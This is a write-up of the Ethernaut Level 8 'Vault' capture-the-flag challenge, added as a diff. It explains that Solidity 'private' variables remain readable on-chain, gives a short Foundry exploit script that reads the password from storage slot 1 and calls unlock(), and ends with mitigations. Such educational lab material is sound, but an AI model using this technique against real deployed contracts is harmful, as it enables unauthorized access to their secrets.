@@ -1,0 +1,223 @@
+# Ethernaut Level 8 – Vault
+
+## Overview
+
+The objective of this challenge is to unlock the `Vault` contract by supplying the correct password.
+
+At first glance, the password appears to be secure because it is declared as a `private` state variable. However, Solidity's `private` visibility only restricts access **between contracts**—it does **not** hide data stored on the blockchain.
+
+Since all contract storage is publicly accessible, an attacker can read the password directly from storage and use it to unlock the vault.
+
+---
+
+# Vulnerable Contract
+
+```solidity
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    constructor(bytes32 _password) {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+```
+
+The contract stores the password as a `private` variable and compares user input against it before unlocking the vault.
+
+---
+
+# Root Cause
+
+The vulnerability comes from assuming that:
+
+```solidity
+bytes32 private password;
+```
+
+keeps the password secret.
+
+In Solidity, the `private` keyword only prevents **other contracts** from accessing the variable directly through Solidity code.
+
+It **does not encrypt or hide** the value stored on-chain.
+
+Every Ethereum node stores contract storage, and anyone can retrieve any storage slot using an RPC call or blockchain tooling.
+
+---
+
+# Storage Layout
+
+The contract's storage is laid out sequentially.
+
+```text
+Slot 0
+┌────────────────────┐
+│ locked (bool)      │
+└────────────────────┘
+
+Slot 1
+┌────────────────────┐
+│ password (bytes32) │
+└────────────────────┘
+```
+
+Since `password` occupies storage slot **1**, reading that slot reveals the secret.
+
+---
+
+# Understanding the Attack
+
+Instead of guessing the password, the attacker simply reads it from storage.
+
+Conceptually:
+
+```text
+Blockchain Storage
+        │
+        ▼
+Storage Slot 1
+        │
+        ▼
+bytes32 Password
+        │
+        ▼
+unlock(password)
+```
+
+No brute force is required because the password already exists in plaintext on-chain.
+
+---
+
+# Exploit
+
+Using Foundry, the password can be read directly with the `vm.load()` cheatcode.
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    bytes32 password =
+        vm.load(address(vaultInstance), bytes32(uint256(1)));
+
+    vaultInstance.unlock(password);
+
+    vm.stopBroadcast();
+}
+```
+
+The exploit performs only two actions:
+
+1. Read storage slot `1`.
+2. Pass the retrieved value to `unlock()`.
+
+---
+
+# Why No Attacker Contract Is Needed
+
+Unlike many Ethernaut levels, this challenge does not require deploying an exploit contract.
+
+Foundry provides:
+
+```solidity
+vm.load(address, slot)
+```
+
+which reads raw storage directly from any deployed contract.
+
+Since the password already exists in storage, the exploit simply retrieves it and submits it back to the contract.
+
+---
+
+# Attack Flow
+
+```text
+Vault Contract
+        │
+        ▼
+Storage Slot 1
+        │
+        ▼
+Password Retrieved
+        │
+        ▼
+unlock(password)
+        │
+        ▼
+locked = false
+        │
+        ▼
+Challenge Solved
+```
+
+---
+
+# Security Impact
+
+Many developers mistakenly believe Solidity visibility modifiers protect confidential information.
+
+In reality, every storage slot of every deployed contract is publicly readable.
+
+Storing secrets such as:
+
+* Passwords
+* API keys
+* Private keys
+* Seed phrases
+* Hidden game values
+
+directly on-chain exposes them to anyone with blockchain access.
+
+This misunderstanding can lead to complete compromise of authentication mechanisms and sensitive application logic.
+
+---
+
+# Recommended Mitigation
+
+Never store confidential information on-chain.
+
+Instead:
+
+* Keep secrets off-chain.
+* Use cryptographic commitment schemes (commit–reveal) when secrecy is required.
+* Use zero-knowledge proofs where appropriate.
+* Treat all on-chain storage as publicly accessible.
+
+Remember:
+
+> **Visibility modifiers control access through Solidity—not visibility on the blockchain.**
+
+---
+
+# Key Takeaways
+
+* `private` is **not** encryption.
+* Every storage slot on Ethereum is publicly readable.
+* Contract storage can be inspected using RPC methods or development tools.
+* Sensitive information should never be stored directly on-chain.
+* Blockchain transparency is a core property of Ethereum and must always be considered during contract design.
+
+---
+
+# Exploit Summary
+
+```solidity
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    bytes32 password =
+        vm.load(address(vaultInstance), bytes32(uint256(1)));
+
+    vaultInstance.unlock(password);
+
+    vm.stopBroadcast();
+}
+```
+
+The exploit reads the password directly from storage slot `1` using Foundry's `vm.load()` cheatcode. Since the password is stored in plaintext despite being marked `private`, it can be retrieved and supplied to `unlock()`, successfully unlocking the vault.
